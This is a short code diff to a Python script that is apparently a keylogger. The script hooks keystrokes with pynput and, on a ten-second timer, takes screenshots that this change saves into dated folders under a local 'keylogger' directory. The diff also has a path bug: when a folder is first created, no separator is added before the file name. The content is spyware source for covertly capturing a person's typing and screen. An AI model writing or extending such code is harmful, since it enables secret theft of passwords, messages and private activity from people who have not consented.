@@ -4,6 +4,7 @@ from pynput import keyboard
 import threading
 import time
 from PIL import ImageGrab
+import os
 time_interval=10
 text=""
 def store_data():
@@ -17,9 +18,15 @@ def store_data():
     
     screenshot = ImageGrab.grab()
     file_name = time.strftime("%d_%m_%Y_%H_%M_%S") + ".png"
-
+    folder_name = time.strftime("%d-%m-%Y")
+    path=f"F:\deskbackup\keylogger\img\{folder_name}"
     # Save the screenshot as an image file
-    screenshot.save("img/"+file_name)
+    if not os.path.exists(path):
+    # Create the folder
+        os.mkdir(path)
+    else:
+        path+="\\"
+    screenshot.save(str(path)+file_name)
     timer = threading.Timer(time_interval,store_data)
     timer.start()
 def on_press(key):
